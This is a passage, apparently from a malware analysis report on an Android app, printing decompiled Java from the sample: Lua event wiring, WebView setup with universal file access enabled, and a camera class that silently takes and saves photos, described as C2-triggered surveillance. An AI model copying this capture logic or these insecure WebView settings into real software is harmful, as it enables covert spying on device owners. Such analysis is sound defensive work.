            	at jadx.core.codegen.MethodGen.addMethodArguments(MethodGen.java:224)
            	at jadx.core.codegen.MethodGen.addDefinition(MethodGen.java:169)
            	at jadx.core.codegen.ClassGen.addMethodCode(ClassGen.java:405)
            	at jadx.core.codegen.ClassGen.addMethod(ClassGen.java:335)
            	at jadx.core.codegen.ClassGen.lambda$addInnerClsAndMethods$3(ClassGen.java:301)
            	at java.base/java.util.stream.ForEachOps$ForEachOp$OfRef.accept(ForEachOps.java:186)
            	at java.base/java.util.ArrayList.forEach(ArrayList.java:1604)
            	at java.base/java.util.stream.SortedOps$RefSortingSink.end(SortedOps.java:395)
            	at java.base/java.util.stream.Sink$ChainedReference.end(Sink.java:261)
            	at java.base/java.util.stream.ReferencePipeline$7$1FlatMap.end(ReferencePipeline.java:284)
            	at java.base/java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:571)
            	at java.base/java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:560)
            	at java.base/java.util.stream.ForEachOps$ForEachOp.evaluateSequential(ForEachOps.java:153)
            	at java.base/java.util.stream.ForEachOps$ForEachOp$OfRef.evaluateSequential(ForEachOps.java:176)
            	at java.base/java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:265)
            	at java.base/java.util.stream.ReferencePipeline.forEach(ReferencePipeline.java:632)
            	at jadx.core.codegen.ClassGen.addInnerClsAndMethods(ClassGen.java:297)
            	at jadx.core.codegen.ClassGen.addClassBody(ClassGen.java:286)
            	at jadx.core.codegen.ClassGen.addClassBody(ClassGen.java:270)
            	at jadx.core.codegen.ClassGen.addClassCode(ClassGen.java:161)
            	at jadx.core.codegen.ClassGen.addInnerClass(ClassGen.java:310)
            	at jadx.core.codegen.ClassGen.lambda$addInnerClsAndMethods$3(ClassGen.java:299)
            	at java.base/java.util.stream.ForEachOps$ForEachOp$OfRef.accept(ForEachOps.java:186)
            	at java.base/java.util.ArrayList.forEach(ArrayList.java:1604)
            	at java.base/java.util.stream.SortedOps$RefSortingSink.end(SortedOps.java:395)
            	at java.base/java.util.stream.Sink$ChainedReference.end(Sink.java:261)
            	at java.base/java.util.stream.ReferencePipeline$7$1FlatMap.end(ReferencePipeline.java:284)
            	at java.base/java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:571)
            	at java.base/java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:560)
            	at java.base/java.util.stream.ForEachOps$ForEachOp.evaluateSequential(ForEachOps.java:153)
            	at java.base/java.util.stream.ForEachOps$ForEachOp$OfRef.evaluateSequential(ForEachOps.java:176)
            	at java.base/java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:265)
            	at java.base/java.util.stream.ReferencePipeline.forEach(ReferencePipeline.java:632)
            	at jadx.core.codegen.ClassGen.addInnerClsAndMethods(ClassGen.java:297)
            	at jadx.core.codegen.ClassGen.addClassBody(ClassGen.java:286)
            	at jadx.core.codegen.ClassGen.addClassBody(ClassGen.java:270)
            	at jadx.core.codegen.ClassGen.addClassCode(ClassGen.java:161)
            	at jadx.core.codegen.ClassGen.makeClass(ClassGen.java:103)
            	at jadx.core.codegen.CodeGen.wrapCodeGen(CodeGen.java:45)
            	at jadx.core.codegen.CodeGen.generateJavaCode(CodeGen.java:34)
            	at jadx.core.codegen.CodeGen.generate(CodeGen.java:22)
            	at jadx.core.ProcessClass.process(ProcessClass.java:79)
            	at jadx.core.ProcessClass.generateCode(ProcessClass.java:117)
            	at jadx.core.dex.nodes.ClassNode.generateClassCode(ClassNode.java:403)
            	at jadx.core.dex.nodes.ClassNode.decompile(ClassNode.java:391)
            	at jadx.core.dex.nodes.ClassNode.getCode(ClassNode.java:341)
            */
    }

    class u implements View.OnFocusChangeListener {
        u() {
        }

        @Override // android.view.View.OnFocusChangeListener
        public void onFocusChange(View view, boolean z) {
            int id = view.getId();
            main.this.luaj.d("focuschange" + id, Integer.valueOf(id), view, Boolean.valueOf(z));
        }
    }

    private void e(View view, int i2, String str) {
        if (addViewEventItme(str, i2, "clicki", "st_vId,st_vW")) {
            view.setOnClickListener(new o());
        }
        if (addViewEventItme(str, i2, "touchmonitor", "st_vId,st_vW,st_eA,st_eX,st_eY,st_rX,st_rY")) {
            view.setOnTouchListener(new p());
        }
        if (addViewEventItme(str, i2, "press", "st_vId,st_vW")) {
            view.setOnLongClickListener(new q());
        }
        if (addViewEventItme(str, i2, "keyboard", "st_vId,st_vW,st_kC,st_eA,st_eR,st_eT")) {
            view.setOnKeyListener(new r());
        }
        if (str.contains("<eventItme type=\"pressmenu\">")) {
            String strC = c.b.a.a.r.c(str, "<eventItme type=\"pressmenu\">", "</eventItme>");
            String[] strArrSplit = strC.split("\ncase ");
            for (int i3 = 1; i3 < strArrSplit.length; i3++) {
                this.l += "function onCreateContextMenu" + i2 + "x" + i3 + "()\n" + c.b.a.a.r.c(strArrSplit[i3], ":", "\nbreak") + "\nend\n";
            }
            String strC2 = c.b.a.a.r.c(strC, "\ndefault:", "\nbreak");
            if (strC2 != null) {
                this.l += "function onCreateContextMenu" + i2 + "x0(st_vId,st_vW)\n" + strC2 + "\nend\n";
            }
            view.setOnCreateContextMenuListener(new s());
        }
        if (view instanceof TextView) {
            if (addViewEventItme(str, i2, "editormonitor", "st_vId,st_vW,st_aI,st_eA,st_eR,st_eK,st_eT")) {
                ((TextView) view).setOnEditorActionListener(new t());
            }
            boolean zAddViewEventItme = addViewEventItme(str, i2, "ontextchanged", "st_vId,st_vW,st_sS,st_sT,st_bE,st_cT");
            boolean zAddViewEventItme2 = addViewEventItme(str, i2, "beforetextchanged", "st_vId,st_vW,st_sS,st_sT,st_cT,st_aR");
            boolean zAddViewEventItme3 = addViewEventItme(str, i2, "aftertextchanged", "st_vId,st_vW,st_sS");
            if (zAddViewEventItme || zAddViewEventItme2 || zAddViewEventItme3) {
                new com.iapp.app.t((TextView) view, this.luaj, zAddViewEventItme, zAddViewEventItme2, zAddViewEventItme3);
            }
        }
        if (view instanceof WebView) {
            l((WebView) view, str);
        }
        if (addViewEventItme(str, i2, "focuschange", "st_vId,st_vW,st_hF")) {
            view.setOnFocusChangeListener(new u());
        }
        if (view instanceof AbsListView) {
            boolean zAddViewEventItme4 = addViewEventItme(str, i2, "onscrollstatechanged", "st_vId,st_vW,st_sE");
            boolean zAddViewEventItme5 = addViewEventItme(str, i2, "onscroll", "st_vId,st_vW,st_fM,st_vT,st_bT");
            if (zAddViewEventItme4 || zAddViewEventItme5) {
                ((AbsListView) view).setOnScrollListener(new a(zAddViewEventItme4, zAddViewEventItme5));
            }
        }
        if (view instanceof AdapterView) {
            if (addViewEventItme(str, i2, "clickitem", "st_vId,st_vW,st_pN,st_iD,st_vW2")) {
                ((AdapterView) view).setOnItemClickListener(new b());
            }
            boolean zAddViewEventItme6 = addViewEventItme(str, i2, "onitemselected", "st_vId,st_vW,st_vW2,st_pN,st_iD");
            boolean zAddViewEventItme7 = addViewEventItme(str, i2, "onnothingselected", "st_vId,st_vW");
            if (zAddViewEventItme6 || zAddViewEventItme7) {
                ((AdapterView) view).setOnItemSelectedListener(new c(zAddViewEventItme6, zAddViewEventItme7));
            }
        }
        if (view instanceof ViewPager) {
            boolean zAddViewEventItme8 = addViewEventItme(str, i2, "onpageselected", "st_vId,st_vW,st_pN");
            boolean zAddViewEventItme9 = addViewEventItme(str, i2, "onpagescrolled", "st_vId,st_vW,st_pN,st_pT,st_pS");
            boolean zAddViewEventItme10 = addViewEventItme(str, i2, "onpagescrollstatechanged", "st_vId,st_vW,st_sE");
            if (zAddViewEventItme8 || zAddViewEventItme9 || zAddViewEventItme10) {
                new com.iapp.app.q((ViewPager) view, this.luaj, zAddViewEventItme8, zAddViewEventItme9, zAddViewEventItme10);
            }
        }
        if (view instanceof DrawerLayout) {
            boolean zAddViewEventItme11 = addViewEventItme(str, i2, "ondrawerclosed", "st_vId,st_vW,st_dW");
            boolean zAddViewEventItme12 = addViewEventItme(str, i2, "ondraweropened", "st_vId,st_vW,st_dW");
            boolean zAddViewEventItme13 = addViewEventItme(str, i2, "onoptionsitemselected", "st_vId,st_vW,st_iM");
            if (zAddViewEventItme11 || zAddViewEventItme12 || zAddViewEventItme13) {
                new com.iapp.app.o((DrawerLayout) view, this.luaj, zAddViewEventItme11, zAddViewEventItme12, zAddViewEventItme13);
            }
        }
        if ((view instanceof SeekBar) && (str.contains("<eventItme type=\"onstarttrackingtouch\">") || str.contains("<eventItme type=\"onstoptrackingtouch\">") || str.contains("<eventItme type=\"onprogresschanged2\">"))) {
            boolean zAddViewEventItme14 = addViewEventItme(str, i2, "onstarttrackingtouch", "st_vId,st_vW");
            boolean zAddViewEventItme15 = addViewEventItme(str, i2, "onstoptrackingtouch", "st_vId,st_vW");
            boolean zAddViewEventItme16 = addViewEventItme(str, i2, "onprogresschanged2", "st_vId,st_vW,st_nS,st_fR");
            if (zAddViewEventItme14 || zAddViewEventItme15 || zAddViewEventItme16) {
                ((SeekBar) view).setOnSeekBarChangeListener(new d(zAddViewEventItme15, zAddViewEventItme14, zAddViewEventItme16));
            }
        }
        f(view, str);
    }

    private void f(View view, String str) {
        if ((view instanceof com.iapp.app.TabLayout) && (str.contains("<eventItme type=\"ontabselected\">") || str.contains("<eventItme type=\"ontabunselected\">") || str.contains("<eventItme type=\"ontabreselected\">"))) {
            ((com.iapp.app.TabLayout) view).addOnTabSelectedListener((TabLayout.OnTabSelectedListener) new e(addViewEventItme(str, view.getId(), "ontabselected", "st_vId,st_vW,st_pN,st_tT,st_taB"), view, addViewEventItme(str, view.getId(), "ontabunselected", "st_vId,st_vW,st_pN,st_tT,st_taB"), addViewEventItme(str, view.getId(), "ontabreselected", "st_vId,st_vW,st_pN,st_tT,st_taB")));
        }
        if (view instanceof RecyclerView) {
            if (str.contains("<eventItme type=\"onscrollstatechanged\">") || str.contains("<eventItme type=\"onscrolled\">")) {
                ((RecyclerView) view).addOnScrollListener(new f(addViewEventItme(str, view.getId(), "onscrollstatechanged", "st_vId,st_vW,st_sE"), addViewEventItme(str, view.getId(), "onscrolled", "st_vId,st_vW,st_fM,st_vT,st_bT,st_dX,st_dY,st_isB")));
            }
            if (str.contains("<eventItme type=\"clickitem\">")) {
                ((RecyclerView) view).addOnItemTouchListener(new h(this, new GestureDetector(this, new g(addViewEventItme(str, view.getId(), "clickitem", "st_vId,st_vW,st_pN,st_vW2"), view))));
            }
        }
        if ((view instanceof VerticalViewPager) && (str.contains("<eventItme type=\"onpageselected\">") || str.contains("<eventItme type=\"onpagescrolled\">") || str.contains("<eventItme type=\"onpagescrollstatechanged\">"))) {
            ((VerticalViewPager) view).setOnPageChangeListener(new i(addViewEventItme(str, view.getId(), "onpageselected", "st_vId,st_vW,st_pN"), view, addViewEventItme(str, view.getId(), "onpagescrolled", "st_vId,st_vW,st_pN,st_pT,st_pS"), addViewEventItme(str, view.getId(), "onpagescrollstatechanged", "st_vId,st_vW,st_sE")));
        }
        if ((view instanceof SwipeRefreshLayout) && str.contains("<eventItme type=\"onrefresh\">")) {
            ((SwipeRefreshLayout) view).setOnRefreshListener(new j(addViewEventItme(str, view.getId(), "onrefresh", "st_vId,st_vW"), view));
        }
        if ((view instanceof CompoundButton) && str.contains("<eventItme type=\"oncheckedchanged\">")) {
            ((CompoundButton) view).setOnCheckedChangeListener(new l(addViewEventItme(str, view.getId(), "oncheckedchanged", "st_vId,st_vW,st_iC"), view));
        }
        if ((view instanceof AppBarLayout) && str.contains("<eventItme type=\"onoffsetchanged\">")) {
            ((AppBarLayout) view).addOnOffsetChangedListener((AppBarLayout.OnOffsetChangedListener) new m(addViewEventItme(str, view.getId(), "onoffsetchanged", "st_vId,st_vW,st_vO")));
        }
    }

    private boolean g(String str, String str2) {
        if (!str.contains("<eventItme type=\"" + str2 + "\">")) {
            return false;
        }
        String strC = c.b.a.a.r.c(str, "<eventItme type=\"" + str2 + "\">", "</eventItme>");
        if (strC == null) {
            return false;
        }
        this.l += "function " + str2 + "()\n" + strC + "\nend\n";
        return true;
    }

    private boolean h(String str, String str2, String str3) {
        if (!str.contains("<eventItme type=\"" + str2 + "\">")) {
            return false;
        }
        String strC = c.b.a.a.r.c(str, "<eventItme type=\"" + str2 + "\">", "</eventItme>");
        if (strC == null) {
            return false;
        }
        this.l += "function " + str2 + "(" + str3 + ")\n" + strC + "\nend\n";
        return true;
    }

    private void i(String str) {
        if (this.m) {
            str = str + "\nloading();\n";
        }
        try {
            this.luaj.g(str);
        } catch (LuaException e2) {
            e2.printStackTrace();
            w.O2(this, "LuaErr：\n" + e2.getMessage());
        }
    }

    private String j(String str, String str2) {
        if (!str.contains("<eventItme type=\"" + str2 + "\">")) {
            return null;
        }
        String strC = c.b.a.a.r.c(str, "<eventItme type=\"" + str2 + "\">", "</eventItme>");
        if (strC != null) {
            return strC;
        }
        return null;
    }

    @TargetApi(11)
    private void k(WebView webView) {
        if (Build.VERSION.SDK_INT >= 11) {
            webView.removeJavascriptInterface("searchBoxJavaBridge_");
            webView.removeJavascriptInterface("accessibility");
            webView.removeJavascriptInterface("accessibilityTraversal");
        }
    }

    @SuppressLint({"SetJavaScriptEnabled"})
    @TargetApi(16)
    private void l(WebView webView, String str) {
        webView.getSettings().setAllowFileAccess(true);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setAppCacheEnabled(true);
        webView.getSettings().setAppCachePath(getApplicationContext().getDir("cache", 0).getPath());
        webView.getSettings().setAppCacheMaxSize(8388608L);
        webView.getSettings().setDatabaseEnabled(true);
        webView.getSettings().setDatabasePath(getApplicationContext().getDir("database", 0).getPath());
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setGeolocationEnabled(true);
        webView.getSettings().setLightTouchEnabled(true);
        com.iapp.app.x5.c.a(webView);
        webView.getSettings().setSupportZoom(true);
        webView.getSettings().setBuiltInZoomControls(true);
        webView.getSettings().setUseWideViewPort(true);
        webView.getSettings().setLoadWithOverviewMode(true);
        if (Build.VERSION.SDK_INT >= 16) {
            webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
            webView.getSettings().setAllowFileAccessFromFileURLs(true);
        }
        webView.setScrollBarStyle(0);
        if (addViewEventItme(str, webView.getId(), "ondownloadstart", "st_vId,st_vW,st_url,st_uT,st_cN,st_mE,st_cH")) {
            new com.iapp.app.n(webView, this.luaj);
        } else {
            webView.setDownloadListener(new k(this));
        }
        new com.iapp.app.x5.b().p(webView, str, this);
        k(webView);
    }

    private void m() {
        String strC;
        String str = this.r;
        if (str != null) {
            String strJ = j(str, "loading");
            if (strJ != null) {
                this.m = true;
                this.l += "function loading()\n" + strJ + "\nend\n";
            }
            this.n = g(this.r, "loadingComplete");
            this.p = h(this.r, "downkey", "st_kC,st_eA,st_eR,st_eT");
            this.q = h(this.r, "upkey", "st_kC,st_eA,st_eR,st_eT");
            this.s = g(this.r, "destroy");
            this.t = g(this.r, "stop");
            this.u = g(this.r, "restart");
            this.v = g(this.r, "start");
            this.w = g(this.r, "resume");
            this.x = g(this.r, "pause");
            this.y = h(this.r, "onactivityresult", "st_sC,st_lC,st_iT");
            this.z = h(this.r, "onrequestpermissionsresult", "st_sC,st_pS,st_gR");
            this.A = h(this.r, "sensor", "st_x,st_y,st_z");
            if (!this.r.contains("<eventItme type=\"menu\">") || (strC = c.b.a.a.r.c(this.r, "<eventItme type=\"menu\">", "</eventItme>")) == null) {
                return;
            }
            String[] strArrSplit = ("m\n" + strC).split("\ncase ", -1);
            this.e = new String[strArrSplit.length];
            for (int i2 = 1; i2 < strArrSplit.length; i2++) {
                this.e[i2] = c.b.a.a.r.c(strArrSplit[i2], null, ":");
                this.l += "function CreateOptionsMenu" + i2 + "()\n" + c.b.a.a.r.c(strArrSplit[i2], ":", "\nbreak") + "\nend\n";
            }
            String strC2 = c.b.a.a.r.c(strC, "\ndefault:", "\nbreak");
            if (strC2 != null) {
                this.o = true;
                this.l += "function onCreateOptionsMenuloading()\n" + strC2 + "\nend\n";
            }
        }
    }

    public boolean addViewEventItme(String str, int i2, String str2, String str3) {
        if (!str.contains("<eventItme type=\"" + str2 + "\">")) {
            return false;
        }
        String strC = c.b.a.a.r.c(str, "<eventItme type=\"" + str2 + "\">", "</eventItme>");
        if (strC == null) {
            return false;
        }
        this.l += "function " + str2 + i2 + "(" + str3 + ")\n" + strC + "\nend\n";
        return true;
    }

    @Override // com.iapp.app.run.iActivity
    protected void d() {
        super.d();
        if (com.iapp.app.a.b == null) {
            c.b.a.a.e.t(this);
            finish();
            return;
        }
        w.k = this.f1963d;
        setContentView(2131427453);
        this.g = getIntent().getExtras().getString("OpenFilexmlui");
        this.f1962c = (LinearLayout) findViewById(2131231172);
        com.iapp.app.b.h3(this, this.g.toLowerCase());
    }

    public void g() {
        this.luaj = new com.iapp.app.d(this);
        this.k = new Aid_luaCode(this, this.luaj);
        this.luaj.l("activity", this);
        this.luaj.l("i", this.k);
        this.luaj.k();
        m();
        if (this.A) {
            SensorManager sensorManager = (SensorManager) getSystemService("sensor");
            this.f1964i = sensorManager;
            Sensor defaultSensor = sensorManager.getDefaultSensor(1);
            this.j = defaultSensor;
            n nVar = new n();
            this.h = nVar;
            this.f1964i.registerListener(nVar, defaultSensor, 2);
        }
        i(this.l);
    }

    /* JADX WARN: Removed duplicated region for block: B:11:0x0059  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public void g(String str) {
        View viewF;
        int i2 = c.b.a.a.r.i(c.b.a.a.r.c(str, "id=\"", "\""), -1);
        int i3 = c.b.a.a.r.i(c.b.a.a.r.c(str, "did=\"", "\""), -1);
        String strC = c.b.a.a.r.c(str, "type=\"", "\"");
        String strH = c.b.a.a.r.h(str, "ppt");
        String strH2 = c.b.a.a.r.h(str, NotificationCompat.CATEGORY_EVENT);
        if (i2 == -1 || i3 == -1) {
            return;
        }
        if (strC.equals("ProgressBar")) {
            String strC2 = c.b.a.a.r.c("\n" + strH + "\n", "\nstyle=", "\n");
            viewF = strC2 != null ? this.f.f(i2, strC, strC2) : this.f.e(i2, strC);
        }
        if (viewF == null) {
            return;
        }
        ViewGroup viewGroup = i3 == 0 ? this.f1962c : (ViewGroup) findViewById(i3);
        viewF.setLayoutParams(this.f.d(viewGroup, viewF));
        if (this.f.a(new com.iapp.app.i(viewF, this), strH)) {
            viewF.setTag(new Object[]{strC, strH, strH2, null});
            e(viewF, i2, strH2);
            viewGroup.addView(viewF);
        }
    }

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, android.app.Activity
    @SuppressLint({"NewApi"})
    protected void onActivityResult(int i2, int i3, Intent intent) throws IllegalStateException {
        super.onActivityResult(i2, i3, intent);
        if (i2 != 1101) {
            if (i2 != 1103) {
                if (this.y) {
                    this.luaj.d("onactivityresult", Integer.valueOf(i2), Integer.valueOf(i3), intent);
                    return;
                }
                return;
            } else {
                com.iapp.app.p pVar = com.iapp.app.p.n;
                if (pVar != null) {
                    pVar.m(i2, i3, intent);
                    return;
                }
                return;
            }
        }
        Uri data = (intent == null || i3 != -1) ? null : intent.getData();
        try {
            ValueCallback<Uri> valueCallback = com.iapp.app.x5.b.f2012d;
            if (valueCallback != null) {
                valueCallback.onReceiveValue(data);
            } else {
                ValueCallback<Uri[]> valueCallback2 = com.iapp.app.x5.b.e;
                if (valueCallback2 != null) {
                    valueCallback2.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(i3, intent));
                }
            }
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        com.iapp.app.x5.b.f2012d = null;
        com.iapp.app.x5.b.e = null;
    }

    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, android.app.Activity, android.content.ComponentCallbacks
    public void onConfigurationChanged(Configuration configuration) {
        super.onConfigurationChanged(configuration);
    }

    @Override // android.app.Activity
    public boolean onContextItemSelected(MenuItem menuItem) {
        this.luaj.c("onCreateContextMenu" + menuItem.getGroupId() + "x" + menuItem.getItemId());
        return true;
    }

    @Override // com.iapp.app.run.iActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    protected void onCreate(Bundle bundle) {
        requestWindowFeature(1);
        super.onCreate(bundle);
    }

    @Override // android.app.Activity
    public boolean onCreateOptionsMenu(Menu menu) {
        String[] strArr = this.e;
        if (strArr != null) {
            int length = strArr.length;
            for (int i2 = 1; i2 < length; i2++) {
                if (this.e[i2].contains("|")) {
                    boolean zC0 = com.iapp.app.i.c0(menu, i2, this.e[i2], this);
                    if (!this.B && zC0) {
                        this.B = true;
                    }
                } else {
                    menu.add(0, i2, 0, this.e[i2]);
                }
            }
        }
        if (this.o) {
            this.luaj.c("onCreateOptionsMenuloading");
        }
        return true;
    }

    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, android.app.Activity
    protected void onDestroy() {
        super.onDestroy();
        if (this.s) {
            this.luaj.c("destroy");
        }
        SensorManager sensorManager = this.f1964i;
        if (sensorManager != null) {
            sensorManager.unregisterListener(this.h, this.j);
        }
    }

    public void onHideCustomViewX() {
        FrameLayout frameLayout = this.fullscreenContainer;
        if (frameLayout == null) {
            return;
        }
        Context context = frameLayout.getContext();
        ((ViewGroup) this.fullscreenContainer.getParent()).removeView(this.fullscreenContainer);
        if (context instanceof Activity) {
            ((Activity) context).getWindow().getDecorView().setSystemUiVisibility(this.originalSystemUiVisibility);
        }
        this.fullscreenContainer.removeAllViews();
        this.fullscreenContainer = null;
        WebChromeClient.CustomViewCallback customViewCallback = this.customViewCallback;
        if (customViewCallback != null) {
            customViewCallback.onCustomViewHidden();
        }
    }

    @Override // androidx.appcompat.app.AppCompatActivity, android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyDown(int i2, KeyEvent keyEvent) {
        if (this.p) {
            return this.luaj.e("downkey", Integer.valueOf(i2), Integer.valueOf(keyEvent.getAction()), Integer.valueOf(keyEvent.getRepeatCount()), keyEvent);
        }
        if (i2 != 4) {
            return false;
        }
        if (this.fullscreenContainer != null) {
            onHideCustomViewX();
            return true;
        }
        finish();
        return true;
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyUp(int i2, KeyEvent keyEvent) {
        if (this.q) {
            return this.luaj.e("upkey", Integer.valueOf(i2), Integer.valueOf(keyEvent.getAction()), Integer.valueOf(keyEvent.getRepeatCount()), keyEvent);
        }
        return false;
    }

    @Override // androidx.appcompat.app.AppCompatActivity, android.app.Activity, android.view.Window.Callback
    public boolean onMenuOpened(int i2, Menu menu) throws IllegalAccessException, NoSuchMethodException, SecurityException, IllegalArgumentException, InvocationTargetException {
        if (this.B && menu != null && menu.getClass().getSimpleName().equalsIgnoreCase("MenuBuilder")) {
            try {
                Method declaredMethod = menu.getClass().getDeclaredMethod("setOptionalIconsVisible", Boolean.TYPE);
                declaredMethod.setAccessible(true);
                declaredMethod.invoke(menu, Boolean.TRUE);
            } catch (Exception e2) {
                e2.printStackTrace();
            }
        }
        return super.onMenuOpened(i2, menu);
    }

    @Override // android.app.Activity
    public boolean onOptionsItemSelected(MenuItem menuItem) {
        this.luaj.c("CreateOptionsMenu" + menuItem.getItemId());
        return true;
    }

    @Override // androidx.fragment.app.FragmentActivity, android.app.Activity
    protected void onPause() {
        super.onPause();
        if (this.x) {
            this.luaj.c("pause");
        }
    }

    @Override // com.iapp.app.run.iActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, android.app.Activity
    public void onRequestPermissionsResult(int i2, @NonNull String[] strArr, @NonNull int[] iArr) {
        super.onRequestPermissionsResult(i2, strArr, iArr);
        if (this.z) {
            this.luaj.d("onrequestpermissionsresult", Integer.valueOf(i2), strArr, iArr);
        }
    }

    @Override // android.app.Activity
    protected void onRestart() {
        super.onRestart();
        w.k = this.f1963d;
        if (this.u) {
            this.luaj.c("restart");
        }
    }

    @Override // androidx.fragment.app.FragmentActivity, android.app.Activity
    protected void onResume() {
        super.onResume();
        if (this.w) {
            this.luaj.c("resume");
        }
    }

    public void onShowCustomViewX(Activity activity, View view, WebChromeClient.CustomViewCallback customViewCallback) {
        if (this.fullscreenContainer != null) {
            customViewCallback.onCustomViewHidden();
            this.fullscreenContainer = null;
            return;
        }
        FrameLayout frameLayout = new FrameLayout(activity);
        this.fullscreenContainer = frameLayout;
        frameLayout.setLayoutParams(new ViewGroup.LayoutParams(-1, -1));
        this.fullscreenContainer.setBackgroundColor(ViewCompat.MEASURED_STATE_MASK);
        Window window = activity.getWindow();
        this.originalSystemUiVisibility = window.getDecorView().getSystemUiVisibility();
        window.addContentView(this.fullscreenContainer, new ViewGroup.LayoutParams(-1, -1));
        window.getDecorView().setSystemUiVisibility(5894);
        this.fullscreenContainer.addView(view);
        this.customViewCallback = customViewCallback;
    }

    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, android.app.Activity
    protected void onStart() {
        super.onStart();
        if (this.v) {
            this.luaj.c("start");
        }
    }

    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, android.app.Activity
    protected void onStop() {
        super.onStop();
        if (this.t) {
            this.luaj.c("stop");
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public void onWindowFocusChanged(boolean z) {
        super.onWindowFocusChanged(z);
        if (!z || this.C) {
            return;
        }
        this.C = true;
        if (this.n) {
            this.luaj.c("loadingComplete");
        }
    }
}
```

### **6.2. The "Mirror" Surveillance Logic (Camera & Audio)**

The `lib.so` payload contains logic to interface with the `android.hardware.camera2` API and the `MediaRecorder` class.

* **Silent Capture:** The malware initiates a `SurfaceTexture` that is 1x1 pixel in size (invisible to the user) to bypass the requirement for a visible camera preview.
* **Trigger Events:** Surveillance is not constant (to save battery and avoid detection). It is triggered by specific "Events" defined in the C2 `config.php`, such as the phone being plugged into a charger or the screen being turned on.

```java
package com.iapp.app;

import android.annotation.TargetApi;
import android.app.Activity;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.hardware.Camera;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import c.b.a.a.w;
import com.iapp.app.run.mian;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.List;

/* loaded from: /home/pana/dev/jadx-1.5.3/20260120_source_apk/classes.dex */
public class m {
    private Activity a;
    private Context b;

    /* renamed from: c, reason: collision with root package name */
    private SurfaceView f1946c;

    /* renamed from: d, reason: collision with root package name */
    private SurfaceHolder f1947d;
    private int e;
    private int f;
    private Camera g;
    private boolean h;

    /* renamed from: i, reason: collision with root package name */
    private boolean f1948i;
    private boolean j;
    private int k;
    private int l;
    private int m;
    private String n;
    private String o;
    Camera.AutoFocusCallback p;
    Camera.PictureCallback q;

    class a implements SurfaceHolder.Callback {
        a() {
        }

        @Override // android.view.SurfaceHolder.Callback
        public void surfaceChanged(SurfaceHolder surfaceHolder, int i2, int i3, int i4) {
        }

        @Override // android.view.SurfaceHolder.Callback
        public void surfaceCreated(SurfaceHolder surfaceHolder) throws IOException {
            m.this.t();
        }

        @Override // android.view.SurfaceHolder.Callback
        public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
            if (m.this.g != null) {
                if (m.this.h) {
                    m.this.g.stopPreview();
                }
                m.this.g.release();
                m.this.g = null;
            }
            m.this.h = false;
        }
    }

    class b implements Camera.AutoFocusCallback {

        class a implements Camera.ShutterCallback {
            a(b bVar) {
            }

            @Override // android.hardware.Camera.ShutterCallback
            public void onShutter() {
            }
        }

        /* renamed from: com.iapp.app.m$b$b, reason: collision with other inner class name */
        class C0063b implements Camera.PictureCallback {
            C0063b(b bVar) {
            }

            @Override // android.hardware.Camera.PictureCallback
            public void onPictureTaken(byte[] bArr, Camera camera) {
            }
        }

        b() {
        }

        @Override // android.hardware.Camera.AutoFocusCallback
        public void onAutoFocus(boolean z, Camera camera) {
            if (z) {
                camera.takePicture(new a(this), new C0063b(this), m.this.q);
            }
        }
    }

    class c implements Camera.PictureCallback {
        c() {
        }

        @Override // android.hardware.Camera.PictureCallback
        public void onPictureTaken(byte[] bArr, Camera camera) throws Throwable {
            Bitmap bitmapDecodeByteArray;
            if (m.this.l != 0) {
                m mVar = m.this;
                bitmapDecodeByteArray = mVar.v(mVar.l, BitmapFactory.decodeByteArray(bArr, 0, bArr.length));
            } else {
                bitmapDecodeByteArray = BitmapFactory.decodeByteArray(bArr, 0, bArr.length);
            }
            try {
                FileOutputStream fileOutputStream = new FileOutputStream(new File(m.this.n));
                bitmapDecodeByteArray.compress(Bitmap.CompressFormat.JPEG, m.this.m, fileOutputStream);
                fileOutputStream.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
            boolean z = m.this.f1948i;
            camera.stopPreview();
            if (z) {
                m.this.h = false;
            } else {
                camera.startPreview();
                m.this.h = true;
            }
            if (m.this.n == null || m.this.o == null) {
                return;
            }
            if (mian.sh) {
                w wVar = new w(m.this.b, m.this.a);
                wVar.S("st_vId", Integer.valueOf(m.this.f1946c.getId()));
                wVar.S("st_vW", m.this.f1946c);
                wVar.S("st_oS", this);
                wVar.S("st_fN", m.this.n);
                wVar.e(m.this.o);
                return;
            }
            Aid_YuCodeX aid_YuCodeX = new Aid_YuCodeX(m.this.b, m.this.a);
            aid_YuCodeX.dim("st_vId", Integer.valueOf(m.this.f1946c.getId()));
            aid_YuCodeX.dim("st_vW", m.this.f1946c);
            aid_YuCodeX.dim("st_oS", this);
            aid_YuCodeX.dim("st_fN", m.this.n);
            aid_YuCodeX.YuGoX(m.this.o);
        }
    }

    public m(Context context, Activity activity, SurfaceView surfaceView, boolean z, int i2) {
        this.a = null;
        this.b = null;
        this.e = -1;
        this.f = -1;
        this.g = null;
        this.h = false;
        this.f1948i = false;
        this.j = false;
